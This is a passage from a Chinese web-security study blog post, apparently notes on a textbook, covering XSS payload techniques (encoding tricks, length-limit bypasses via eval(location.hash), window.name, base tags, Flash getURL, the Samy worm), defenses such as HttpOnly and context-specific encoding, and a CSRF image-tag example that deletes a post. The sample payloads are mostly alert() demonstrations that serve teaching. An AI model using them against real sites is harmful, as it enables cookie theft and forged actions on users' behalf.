+<p>对于验证码，XSS Payload可以通过读取页面内容，将验证码的图片URL发送到远端服务器——攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload。</p>
+<p>修改密码的问题稍微复杂点，攻击者可以将XSS与“钓鱼”相结合。利用JavaScript实现一个伪造的登录框，当用户输入用户名和密码后，将密码发送至黑客的服务上。</p>
+<h3 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h3><p>攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如知道用户使用的浏览器、操作系统，就有可能实施一次精准的浏览器内存攻击，最后给用户电脑植入一个木马。</p>
+<p>比如使用XSS读取浏览器的UserAgent对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(navigator.userAgent);</span><br></pre></td></tr></table></figure>
+<p>但是这个对象是可以伪造的，所以信息不一定准确。</p>
+<p>可以有另外一种技巧，来更准确地识别用户的浏览器版本</p>
+<p>由于浏览器之间的实现存在差异，同一个浏览器不同版本之前可能也有细微的差别。通过判断这些差异，就能准确的识别出浏览器版本。</p>
+<p>比如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) <span class="comment">// MSIE 6.0 or below</span></span><br></pre></td></tr></table></figure>
+<h3 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h3><p>在IE中，可以通过判断ActiveX控件的classid是否存在，来判断用户是否安装了该软件，选择对应的浏览器漏洞，最终达到植入木马的目的。</p>
+<p>一些第三方软件也可能会泄漏一些信息。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。</p>
+<p>浏览器的扩展和插件也能被XSS Payload扫描出来。比如Firefox的插件(Plugin)列表存放在一个DOM对象中，通过查询DOM可以遍历所有的插件。</p>
+<h3 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h3><p>通过CSS可以获取一个用户曾经访问过的网站。其原理利用的是style的visited属性。如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同。</p>
+<h3 id="获取用户的真实IP地址"><a href="#获取用户的真实IP地址" class="headerlink" title="获取用户的真实IP地址"></a>获取用户的真实IP地址</h3><p>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢？</p>
+<p>JavaScript本身并没有提供获取本地IP地址的能力，XSS攻击需要借助第三方软件来完成。比如，客户端安装了Java环境(JRE),那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。</p>
+<p>除了Java之外，一些ActiveX控件可能也会提供接口查询本地IP地址。这些功能比较特殊，需要具体情况具体分析。</p>
+<h2 id="XSS攻击平台"><a href="#XSS攻击平台" class="headerlink" title="XSS攻击平台"></a>XSS攻击平台</h2><p>有安全研究者将许多功能封装起来，称为XSS攻击平台。这些平台主要是为了演示XSS的危害，以及方便渗透测试使用。</p>
+<h2 id="终极武器：XSS-Worm"><a href="#终极武器：XSS-Worm" class="headerlink" title="终极武器：XSS Worm"></a>终极武器：XSS Worm</h2><p>XSS也能形成蠕虫</p>
+<h3 id="Samy-Worm"><a href="#Samy-Worm" class="headerlink" title="Samy Worm"></a>Samy Worm</h3><p>在2005年有年仅19岁的Samy Kamkar对MySpace.com发起的，这是Web安全史上第一个重量级的XSS Worm。</p>
+<p>首先，Myspace网站过滤掉了很多危险的标签，所有的事件如”onclick“等也被过滤了。但是它允许用户控制标签的style属性，通过style还是有办法构造出XSS的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:url('javascript:alert(1)')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其次，Myspace同时还过滤了‘javasript’、‘onreadystatechange’等敏感词，所以Samy用了”拆分法“绕过这些限制。</p>
+<p>最后，Samy通过AJAX构造的POST请求，完成了在用户的heros列表里添加自己名字的功能：同时复制蠕虫自身进行传播。</p>
+<p>XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的。但是发起它是有一定条件的。</p>
+<p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击。</p>
+<p>比如，发送站内信、用户留言等页面，都是XSS Worm的高发区。</p>
+<h2 id="XSS构造技巧"><a href="#XSS构造技巧" class="headerlink" title="XSS构造技巧"></a>XSS构造技巧</h2><h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>”百度搜藏”曾经在一个<code>&lt;script&gt;</code>标签中输出了一个变量</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl = <span class="string">"\";alert(/xss/);"</span>;</span><br></pre></td></tr></table></figure>
+<p>变量处于双引号内，系统转义了双引号导致变量无法“escape”。</p>
+<p>但是，返回页面是GBK/GB2312编码的，因此”%c1\“这两个字符组合在一起后，会成为一个Unicode字符。所以构造：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c1<span class="string">";alert(/xss/);//</span></span><br></pre></td></tr></table></figure>
+<p>并提交，得到如下效果</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> readirectUrl = <span class="string">"乱码"</span>;alert(<span class="number">2</span>);<span class="comment">//";</span></span><br></pre></td></tr></table></figure>
+<h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">"$var"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果服务器对$var做个严格的长度限制，假如长度限制为20个字节</p>
+<p>攻击者这样构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var 为： &quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>超过了长度。</p>
+<p>这样构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var 为： &quot;onclick=alert(1)//</span><br></pre></td></tr></table></figure>
+<p>不会超过长度限制</p>
+<p>最好的办法是将XSS Payload写到别处，再通过简短的代码加载它。</p>
+<p>最常用的一个”藏代码“的地方，就是”localtion.hash”,它的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录下location.hash里的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var 修改为： &quot; onclick=&quot;eval(location.hash.substr(1))</span><br></pre></td></tr></table></figure>
+<p>当然，还可以使用远程加载js的方法，以避免浏览器地址栏长度的限制。</p>
+<h3 id="使用标签"><a href="#使用标签" class="headerlink" title="使用标签"></a>使用<base>标签</h3><p><code>&lt;base&gt;</code>标签并不常用，它定义页面上所有使用”相对路径”标签的hosting地址。它可以出现在页面的任何地方，并作用于位于该标签之后的所有标签。</p>
+<p>攻击可以在页面中插入<code>&lt;base&gt;</code>标签，通过在远程服务器伪造图片、链接或脚本，劫持当前页面中所使用“相对路径”的标签</p>
+<p>所以在设计XSS安全方案时，一定要过滤掉这个危险的标签。</p>
+<h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>window对象是浏览器的窗体，很多时候window对象不受同源策略限制，可以实现跨域、跨页面传递数据。</p>
+<p>使用window.name可以缩短XSS Payload的长度</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.name = <span class="string">"alert(document.cookie)"</span>;</span></span><br><span class="line"><span class="javascript">  location.href = <span class="string">"http://www.xss.com"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在同一个窗口打开XSS的站点后，只需要通过XSS执行代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">window</span>.name);</span><br></pre></td></tr></table></figure>
+<h3 id="Apache-Expect-Header-XSS"><a href="#Apache-Expect-Header-XSS" class="headerlink" title="Apache Expect Header XSS"></a>Apache Expect Header XSS</h3><p>向服务器提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expect: &lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>当服务器出错返回时，Expect头的内容未经任何处理便会写入页面。对于XSS攻击来说，JavaScript工作在渲染后的浏览器环境中，无法控制用户浏览器发出的HTTP头。该漏洞当初被认为是一个鸡肋。</p>
+<p>但是，使用Flash，可以自定义大多数请求的HTTP头。因此，Flash在新版本中禁止用户发送Expect头。但后来发现可以通过注入HTTP头的方式绕过这个限制，Flash目前已经修补了该问题。</p>
+<p>此类攻击，还可以通过Java Applet等构造HTTP请求的第三方插件来实现。</p>
+<h3 id="Anehta的回旋镖"><a href="#Anehta的回旋镖" class="headerlink" title="Anehta的回旋镖"></a>Anehta的回旋镖</h3><p>反射型XSS也可能像存储型XSS一样利用。</p>
+<p>回旋镖的思路是：如果在B域上存在一个反射型“XSS_B”,在A域上存在一个存储型“XSS_A”,当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B“，则可以达到在A域的XSS攻击B域用户的目的。</p>
+<p>我们知道，在IE中，<code>&lt;iframe&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;link&gt;</code>等标签都会拦截”第三方Cookie“的发送。在Firefox则无这种限制（第三方Cookie指得是保存在本地的Cookie,也就是服务器设置了expire时间的Cookie）。</p>
+<p>所以对于Firefox，只需要在XSS_A处嵌入一个iframe即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://www.b.com/?xss...&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>对于IE，为了达到执行XSS_B的目的，可以使用一个<code>&lt;form&gt;</code>标签，在浏览器提交form表单时，不会拦截第三方Cookie的发送。因此，先在XSS_A上写一个<code>&lt;form&gt;</code>,自动提交到XSS_B，然后在XSS_B中再跳转回原来的XSS_A,完成了一个”回旋镖“。这种攻击的缺点是，用户会看到地址栏的变化。</p>
+<h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>在Flash中是可以嵌入ActionScript脚本的，</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getURL(<span class="string">"javascript:alert(document.cookie)"</span>);</span><br></pre></td></tr></table></figure>
+<p>使用<code>&lt;embed&gt;</code>将Flash嵌入页面中。</p>
+<p>在实现XSS Filter时，一般会禁用<code>&lt;embed&gt;</code>、<code>&lt;object&gt;</code>等标签。后者甚至可以加载ActiveX控件。</p>
+<p>如果网站一定要使用Flash,如果仅仅是视频文件，则要求其转码为”flv文件“。flv是静态文件，不会产出安全隐患。如果是带动态脚本的Flash，可以通过Flash的配置参数限制。</p>
+<p>限制Flash动态脚本的最重要的参数是”allowScriptAccess“，这个参数定义了Flash能否与HTML页面进行通信。它有三个可选值：</p>
+<p>1.always 不做任何限制</p>
+<p>2.sameDomain 只允许来自于本域的Flash与Html通信，默认值</p>
+<p>3.nerver 禁止</p>
+<p>allowNetworking 也非常关键,它能控制Flash与外部网络进行通信</p>
+<p>1.all 允许所有网络 默认值</p>
+<p>2.internal 不能与浏览器通信如navigateToURL,但可以调用其他的API</p>
+<p>3.none 禁止</p>
+<p>除了用户上传的Flash文件能够实施脚本攻击外，一些Flash也可能会产生XSS漏洞。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on (release) &#123;</span><br><span class="line">  getURL(_root.clickTAG, <span class="string">"_blank"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码缺乏输入验证，会被XSS攻击。</p>
+<h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>浏览器禁止页面的JavaScript访问带有HttpOnly属性的Cookie。它解决的是XSS后的Cookie劫持攻击。</p>
+<p>HttpOnly是在服务器返回的响应头Set-Cookie上标记的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;Max-Age&gt;=&lt;age&gt;]</span><br><span class="line">[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]</span><br><span class="line">[; path=&lt;some_path&gt;][; secure][; HttpOnly]</span><br></pre></td></tr></table></figure>
+<h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>XSS要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。</p>
+<p>输入检查的逻辑，必须放在服务端代码中实现。如果只是在客户端使用JavaScript进行输入检查，很容易被攻击者绕过。目前的普遍做法是，同时在客户端和服务端实现相同的输入检查。客户端检查可以阻挡大部分误操作的用户，从而节省服务器资源。</p>
+<p>XSS输入检查一般会检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，将这些字符过滤或者编码。</p>
+<p>比较智能的输入检查，可能会匹配XSS的特征。比如查找用户数据中是否包含了<code>&lt;script&gt;</code>、javascript等敏感字符。</p>
+<p>这种输入检查的方式，称为XSS Filter。</p>
+<p>XSS Filter只获取了用户提交的数据进行检查，但是并没有结合渲染页面的HTML代码，因此对语境的理解并不完整。</p>
+<p>例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$var"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。而大多数情况下，URL是合法的用户数据。</p>
+<p>XSS Filter还有一个问题，对&lt;、&gt;的处理可能会改变用户语义。</p>
+<p>比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1&lt;3</span><br></pre></td></tr></table></figure>
+<p>如果XSS Filter不够智能，粗暴地过滤或者替换&lt;，则会改变用户原来的意思。</p>
+<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>既然输入检查存在这么多问题，那输出检查又如何呢?</p>
+<p>一般来说，除了富文本输出外，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>
+<h4 id="安全的编码函数"><a href="#安全的编码函数" class="headerlink" title="安全的编码函数"></a>安全的编码函数</h4><p>编码分为很多种，针对HTML代码的编码方式是HtmlEncode。<br>HtmlEncode并非专有名词，它只是一种函数实现。它的作用是将字符转换成HTMLEntities,对应的标准是ISO-8859-1</p>
+<p>为了对抗XSS,在HTMLEncode中要求至少转换以下字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; -&gt; &amp;amp;</span><br><span class="line">&lt; -&gt; &amp;lt;</span><br><span class="line">&gt; -&gt; &amp;gt;</span><br><span class="line">&quot; -&gt; &amp;quot;</span><br><span class="line">&apos; -&gt; &amp;#x27;</span><br><span class="line">/ -&gt; &amp;#x2F</span><br></pre></td></tr></table></figure>
+<p>Javascript的编码方式可以使用JavaScriptEncode</p>
+<p>它使用”\”对特殊字符进行转义。在对抗XSS时还要求输出的变量必须在引号内部，以避免造成安全问题。</p>
+<p>比较两种写法</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = escapeJavaScript($evil);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">'"'</span>+escapeJavaScript($evil)+<span class="string">'"'</span>;</span><br></pre></td></tr></table></figure>
+<p>如果只是转义了几个危险字符，如’、”、&lt;、&gt;、\、&amp;、#等，那么可能会输出</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;alert(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">"1;alert(2);"</span>;</span><br></pre></td></tr></table></figure>
+<p>攻击者即使想要逃脱出引号的范围，也会遇到困难。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = <span class="string">"\";alert(1);\/\/"</span>;</span><br></pre></td></tr></table></figure>
+<p>但是开发者没有这个习惯怎么办？</p>
+<p>那就只能使用一个更加严格的JavaScriptEncode函数来保证安全了——除了数字、字母外的所有字符，都使用十六进制“\xHH”的方式进行编码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;alert(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>变成了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>\x3balert\x282\x29;</span><br></pre></td></tr></table></figure>
+<p>此外还有其他编码函数，如XMLEncode、JSONEncode等</p>
+<h4 id="只需要一种编码吗"><a href="#只需要一种编码吗" class="headerlink" title="只需要一种编码吗"></a>只需要一种编码吗</h4><p>XSS主要发生在MVC架构中的View层。大部分的XSS漏洞可以在模板系统中解决。</p>
+<p>如Python的开发框架Django自带的模板系统”Django Templates”，可以使用escape进行HtmlEncode,并且在Django1.0中得到了加强——默认所有的变量都会被escape。</p>
+<p>但这样还是不能完全避免XSS问题，需要“在正确的地方使用正确的编码方式”</p>
+<p>例如</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('$var');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果用户输入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">var</span> = htmlencode(<span class="string">"');alert('2"</span>);</span><br></pre></td></tr></table></figure>
+<p>对于浏览去器来说，htmlparser会优先于JavaScript Parser执行</p>
+<p>经过解析后，结果为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('');alert('2');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>xss被注入。</p>
+<p>xss发出的原因是，没有分清楚输出变量的语境，并非在模板引擎中使用了auto-escape就万事大吉了。</p>
+<h3 id="正确防御XSS"><a href="#正确防御XSS" class="headerlink" title="正确防御XSS"></a>正确防御XSS</h3><p>XSS的本质是一种“HTML注入”，想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。</p>
+<h4 id="在HTML标签中输出"><a href="#在HTML标签中输出" class="headerlink" title="在HTML标签中输出"></a>在HTML标签中输出</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>防御的方法是对变量使用HtmlEncode</p>
+<h4 id="在HTML属性中输出"><a href="#在HTML属性中输出" class="headerlink" title="在HTML属性中输出"></a>在HTML属性中输出</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">"$var"</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>防御的方法是对变量也是使用HtmlEncode</p>
+<h4 id="在script标签中输出"><a href="#在script标签中输出" class="headerlink" title="在script标签中输出"></a>在script标签中输出</h4><p>首先应该确保输出的变量在引号中：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> x = <span class="string">"$var"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>防御时使用JavaScriptEncode</p>
+<h4 id="在事件中输出"><a href="#在事件中输出" class="headerlink" title="在事件中输出"></a>在事件中输出</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('$var')"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>防御方式和在script标签中输出类似</p>
+<h4 id="在CSS中输出"><a href="#在CSS中输出" class="headerlink" title="在CSS中输出"></a>在CSS中输出</h4><p>比如@import、url等直接加载XSS、expression(alert(‘xss’))等</p>
+<p>一方面需尽可能避免用户可控制的变量在css中输出，如果必须有这样的需求，那么使用encodeForCSS</p>
+<h4 id="在地址栏输出"><a href="#在地址栏输出" class="headerlink" title="在地址栏输出"></a>在地址栏输出</h4><p>一般来说使用URLEncode即可，但是如果整个URL被用户完全控制，Protocal和Host是不能使用URLEncode的，否则会改变URL的语义。</p>
+<p><code>[Protocal][Host][Path][Search][Hash]</code></p>
+<p>例如<a href="https://www.evil.com/a/b/c/test?abc=123#ssss" target="_blank" rel="noopener">https://www.evil.com/a/b/c/test?abc=123#ssss</a></p>
+<p>对于如下的输出方式：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>攻击者可能会构造伪协议实施攻击</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1);"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此外，“vbscript”、“dataURI”等伪协议也可以导致脚本执行。</p>
+<p>一般来说，对于用户控制整个URL，应该先检查是否以“http”开头，如果不是则自动添加，以保证不会出现伪协议类的XSS攻击，然后再对变量进行URLEncode。</p>
+<h3 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本"></a>处理富文本</h3><p>网站允许用户提交一些自定义的HTML代码，称之为富文本。</p>
+<p>在处理富文本时，还是要回到“输入检查”的思路上来。“输入检查”的主要问题是检查时还不知道变量的输出语境。但富文本数据，其语义是完整的HTML,在输出时也不会拼凑到某个标签的属性中。因此，可以特殊对待。</p>
+<p>通过htmlparser可以解析出HTML代码的标签、标签属性和事件。</p>
+<p>在过滤富文本时，事件应该被严格禁止、而一些危险的标签，比如iframe、script、base、form等也是应该严格禁止的。在标签选择上，应该使用白名单。比如，只允许a、img、div等比较安全的标签。“白名单”同样应该用于属性和事件的选择。</p>
+<p>在富文本过滤中，处理CSS也是一件麻烦的事，因此应该禁止用户自定义CSS和style。如果不能禁止，那就需要一个CSS Parser对样式进行智能分析，检查其中是否包含危险代码。</p>
+<h3 id="防御DOM-Based-XSS"><a href="#防御DOM-Based-XSS" class="headerlink" title="防御DOM Based XSS"></a>防御DOM Based XSS</h3><p>DOM Based XSS前文提到的几种防御方法都不太适用。</p>
+<p>DOM Based XSS是从JavaScript中输出数据到HTML页面里，而前文都是针对从服务器应用直接输出到HTML页面的XSS漏洞。</p>
+<p>服务器执行了javascriptEscape，输出的数据又重新渲染到了页面中，对变量进行了解码，仍然会产生XSS。</p>
+<p>正确的防御方法是，在$var输出到script时，执行一次javaScriptEncode，其次在输出到HTML页面时，如果输出到事件或者脚本，则要再做一次javaScriptEncode；如果输出到HTML内容或者属性，则再做一次HtmlEncode。</p>
+<p>触发DOM Based XSS的地方有很多，以下几个地方是JavaScript输出到HTML页面的必经之路。</p>
+<p>document.write()</p>
+<p>document.writeln()</p>
+<p>xxx.innerHTML=</p>
+<p>xxx.outerHTML=</p>
+<p>innerHTML.replace</p>
+<p>document.attachEvent()</p>
+<p>window.attachEvent()</p>
+<p>document.location.replace()</p>
+<p>document.location.assign()</p>
+<p>…</p>
+<p>需要重点关注这几个地方的参数是否可以被用户控制</p>
+<p>除了服务器端直接输出变量到JavaScript外，还有以下几个地方可能成为DOM Based XSS的输出点，也需要重点关注。</p>
+<p>inputs框</p>
+<p>window.location(href、hash等)</p>
+<p>window.name</p>
+<p>document.referrer</p>
+<p>document.cookie</p>
+<p>localstorage</p>
+<p>XMLHttpRequest返回的数据</p>
+<p>…</p>
+<h3 id="换个角度看XSS的风险"><a href="#换个角度看XSS的风险" class="headerlink" title="换个角度看XSS的风险"></a>换个角度看XSS的风险</h3><p>前面都是从漏洞的形成原理上看的，如果从业务风险角度看则有不同的观点</p>
+<p>一般来说，存储型XSSS的风险高于反射型。因为它保存在服务器上，有可能会跨页面存在。它不会改变页面URL的原有结构，因此有时候还能逃过一些IDS的检测。</p>
+<p>从攻击过程来说，反射型XSS，一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；而存储型XSS,则只需要让用户查看一个正常的URL链接。</p>
+<p>从风险角度看，用户之间有互动的页面，是可能发起XSS Worm攻击的地方。而根据不同页面的PageView高低，也可以分析出哪些页面受XSS攻击后的影响更大。</p>
+<p>在修补漏洞时遇到的最大挑战之一是漏洞数量太多，开发者不太来得及立刻修复所有漏洞。从业务风险角度来重新定位每个XSS漏洞，就具有了重要意义。</p>
+<h1 id="跨站点请求伪造-CSRF"><a href="#跨站点请求伪造-CSRF" class="headerlink" title="跨站点请求伪造(CSRF)"></a>跨站点请求伪造(CSRF)</h1><p>CSRF（Cross Site Request Forgery），跨站点请求伪造。</p>
+<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>攻击者首先在自己的域构造一个页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/csrf.html</span><br></pre></td></tr></table></figure>
+<p>其内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://blog.com/article?m=delete&amp;id=1&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>攻击者诱使目标用户（博主），访问这个页面，id=1的一篇博客文章就被删除了。</p>
+<p>这里攻击者以该用户身份（本质上是发送了Cookie）在第三方站点里发送了请求，这个请求是攻击者伪造的，所以叫”跨站点请求伪造”。</p>
